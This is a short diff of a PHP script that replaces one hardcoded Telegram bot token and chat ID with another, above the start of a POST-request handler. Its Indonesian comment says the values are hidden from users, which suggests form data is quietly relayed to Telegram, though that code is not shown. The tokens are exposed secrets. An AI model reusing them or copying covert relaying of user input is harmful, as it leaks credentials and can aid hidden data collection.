@@ -1,7 +1,7 @@
 <?php
 // Masukkan Token dan Chat ID di sini (Aman, tidak terlihat oleh user)
-$token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
-$chat_id = '-4932277785';
+$token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
+$chat_id = '-5116717257';
 
 // Cek apakah ada data yang dikirim via POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
